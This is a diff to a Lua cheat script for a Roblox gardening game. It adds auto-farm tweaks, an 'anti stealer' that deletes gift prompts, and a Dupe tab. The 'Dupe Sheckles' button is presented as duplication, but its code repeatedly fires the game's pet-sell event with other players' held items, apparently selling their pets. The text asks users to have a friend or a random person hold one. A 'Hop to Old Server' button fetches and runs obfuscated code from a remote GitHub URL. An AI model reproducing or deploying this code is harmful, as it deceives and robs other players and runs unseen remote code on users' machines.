@@ -12,13 +12,14 @@ local localeId = player.LocaleId
 local isRussian = localeId == "ru-ru"
 
 local englishText = {
-    windowTitle = "Egas X! [0.25Rewr]",
+    windowTitle = "Egas X! [0.26Rewr]",
     windowNote = "Enter the key to access the script.\n\nNo key? Join our Discord be button!",
     homeTabTitle = "Home",
     autoFarmTabTitle = "Auto Farm",
     freeSeedsTabTitle = "Free Seeds",
     miscTabTitle = "Misc",
     guiTabTitle = "GUI",
+    dupeTabTitle = "Dupe",
     welcomeTitle = "Welcome to Egased Hub!",
     welcomeDesc = "This script helps you grow your garden efficiently.",
     discordButtonTitle = "Copy Discord Link",
@@ -35,8 +36,11 @@ local englishText = {
     autoBuySeedsDesc = "Automatically buys rare seeds: Mushroom, Coconut, Cactus, Dragon Fruit, Grape, Mango.",
     autoSpendSeedPackTitle = "Auto Spend Seed Pack",
     hopServerTitle = "Hop to Old Server",
+    hopServerDesc = "An ad will appear first, which you need to close. Then, wait 1 to 3 minutes depending on server availability.",
     get100SeedsTitle = "Get 100 Seeds",
     get100SeedsDesc = "Get ~100 seeds instead of 1. Hold the item you want an Angry Plant from!",
+    dupeShecklesTitle = "Dupe Sheckles",
+    dupeShecklesDesc = "Your friend or random person should pick In hand pet for dupe. USE ONLY IN OLD SERVER!!!",
     freeSeedsPatchTitle = "FREE SEED PACKS WAS PATCHED. STAY TUNED.",
     autoBuyGearTitle = "Auto Buy Every Gear",
     characterSpeedTitle = "Character Speed",
@@ -45,6 +49,7 @@ local englishText = {
     boostFpsNotifyTitle = "FPS Boost Disabled",
     boostFpsNotifyContent = "Please rejoin the game to restore other farms and player models.",
     disable3dRenderingTitle = "Disable 3D Rendering",
+    antiStillerTitle = "Anti Stiller Script [DISABLE GIFTS]",
     hiddenGearButtonTitle = "Enable Hidden Gear Button",
     shopGUITitle = "Shop GUI",
     gearShopTitle = "Gear Shop",
@@ -60,6 +65,7 @@ local russianText = {
     freeSeedsTabTitle = "Бесплатные семена",
     miscTabTitle = "Разное",
     guiTabTitle = "Интерфейс",
+    dupeTabTitle = "Дюп",
     welcomeTitle = "Добро пожаловать в Egased Hub!",
     welcomeDesc = "Этот скрипт помогает эффективно выращивать ваш сад. хотя нет. не помогает.",
     discordButtonTitle = "Скопировать ссылку на Discord",
@@ -76,8 +82,11 @@ local russianText = {
     autoBuySeedsDesc = "Автоматически покупает редкие семена: Гриб, Кокос, Кактус, Драконий фрукт, Виноград, Манго.",
     autoSpendSeedPackTitle = "Автоиспользование набора семян",
     hopServerTitle = "Перейти на старый сервер",
+    hopServerDesc = "Сначала появится реклама, которую нужно закрыть. Затем придется подождать от 1 до 3 минут в зависимости от заполненности серверов.",
     get100SeedsTitle = "Получить 100 семян",
     get100SeedsDesc = "Получите ~100 семян вместо 1. Держите предмет, из которого хотите получить Angry Plant!",
+    dupeShecklesTitle = "Дюп Шекелей",
+    dupeShecklesDesc = "Ваш друг или случайный человек должен взять питомца в руки для дюпа. ИСПОЛЬЗУЙТЕ ТОЛЬКО НА СТАРОМ СЕРВЕРЕ!!!",
     freeSeedsPatchTitle = "БЕСПЛАТНЫЕ НАБОРЫ СЕМЯН БЫЛИ ЗАПАТЧЕНЫ. СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ.",
     autoBuyGearTitle = "Автопокупка всего снаряжения",
     characterSpeedTitle = "Скорость персонажа",
@@ -86,6 +95,7 @@ local russianText = {
     boostFpsNotifyTitle = "Увеличение FPS отключено",
     boostFpsNotifyContent = "Перезайдите в игру, чтобы восстановить фермы и модели других игроков.",
     disable3dRenderingTitle = "Отключить 3D-рендеринг",
+    antiStillerTitle = "Анти-Стиллер Скрипт [ОТКЛЮЧАЕТ ПОДАРКИ]",
     hiddenGearButtonTitle = "Включить скрытую кнопку снаряжения",
     shopGUITitle = "Магазин семян",
     gearShopTitle = "Магазин снаряжения",
@@ -94,6 +104,16 @@ local russianText = {
 }
 
 local text = isRussian and russianText or englishText
+
+-- Add Pride theme
+WindUI:AddTheme({
+    Name = "Pride 🏳️‍🌈",
+    Accent = Color3.fromRGB(255, 255, 255),
+    Outline = Color3.fromRGB(0, 0, 0),
+    Text = Color3.fromRGB(0, 0, 0),
+    Placeholder = Color3.fromRGB(100, 100, 100),
+    Background = "rbxassetid://9795451879"
+})
 
 local Window = WindUI:CreateWindow({
     Title = text.windowTitle,
@@ -133,6 +153,7 @@ local AutoFarmTab = Window:Tab({ Title = text.autoFarmTabTitle, Icon = "tractor"
 local MiscTab = Window:Tab({ Title = text.miscTabTitle, Icon = "settings" })
 local GUITab = Window:Tab({ Title = text.guiTabTitle, Icon = "monitor" })
 local FreeSeedsTab = Window:Tab({ Title = text.freeSeedsTabTitle, Icon = "leaf" })
+local DupeTab = Window:Tab({ Title = text.dupeTabTitle, Icon = "copy" })
 
 HomeTab:Paragraph({
     Title = text.welcomeTitle,
@@ -227,8 +248,6 @@ else
         end
     })
     
-     
-
     AutoFarmTab:Toggle({
         Title = text.autoSellTitle,
         Default = false,
@@ -245,13 +264,10 @@ else
                             local shopStand = workspace.NPCS:FindFirstChild("Sell Stands") and workspace.NPCS["Sell Stands"]:FindFirstChild("Shop Stand")
                             if shopStand then
                                 local currentCFrame = root.CFrame
-                                -- Step 1: Teleport and wait 0.3 seconds
                                 root.CFrame = shopStand.CFrame * CFrame.new(0, 0, 3)
                                 wait(0.3)
-                                -- Step 2: Sell inventory and wait 0.6 seconds
                                 ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Sell_Inventory"):FireServer()
                                 wait(0.6)
-                                -- Step 3: Teleport back
                                 root.CFrame = currentCFrame
                             else
                                 warn("Shop Stand not found")
@@ -503,6 +519,42 @@ MiscTab:Toggle({
     end
 })
 
+MiscTab:Button({
+    Title = text.antiStillerTitle,
+    Callback = function()
+        local Players = game:GetService("Players")
+        local RunService = game:GetService("RunService")
+        local LocalPlayer = Players.LocalPlayer
+        if LocalPlayer and RunService then
+            RunService.RenderStepped:Connect(function()
+                for _, player in pairs(Players:GetPlayers()) do
+                    if player ~= LocalPlayer then
+                        local character = player.Character
+                        if character then
+                            local giftPrompt = character:FindFirstChild("GiftPrompt")
+                            if giftPrompt then
+                                pcall(function()
+                                    giftPrompt:Destroy()
+                                end)
+                            end
+                            local hrp = character:FindFirstChild("HumanoidRootPart")
+                            if hrp then
+                                local proximityPrompt = hrp:FindFirstChildWhichIsA("ProximityPrompt")
+                                if proximityPrompt then
+                                    pcall(function()
+                                        proximityPrompt:Destroy()
+                                    end)
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+        warn("Anti Stealer is started")
+    end
+})
+
 local hiddenGearButtonEnabled = false
 GUITab:Toggle({
     Title = text.hiddenGearButtonTitle,
@@ -561,6 +613,40 @@ GUITab:Toggle({
     end
 })
 
+DupeTab:Button({
+    Title = text.hopServerTitle,
+    Desc = text.hopServerDesc,
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/realuerd/obf/refs/heads/main/oldserverjoiner",true))()
+    end
+})
+
+DupeTab:Button({
+    Title = text.dupeShecklesTitle,
+    Desc = text.dupeShecklesDesc,
+    Callback = function()
+        local RunService = game:GetService("RunService")
+        local ReplicatedStorage = game:GetService("ReplicatedStorage")
+        local Players = game:GetService("Players")
+        local localPlayer = Players.LocalPlayer
+        RunService.Heartbeat:Connect(function()
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player ~= localPlayer then
+                    local character = player.Character
+                    if character then
+                        local tool = character:FindFirstChildOfClass("Tool")
+                        if tool then
+                            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("SellPet_RE"):FireServer(tool)
+                        end
+                    end
+                end
+            end
+        end)
+    end
+})
+
 local nightQuestPrompt = workspace:WaitForChild("NightEvent"):WaitForChild("Prompt"):WaitForChild("Head"):WaitForChild("ProximityPrompt"):WaitForChild("NightQuestNPCDialogue")
 
 Window:SelectTab(1)
+
+print("script loaded!")
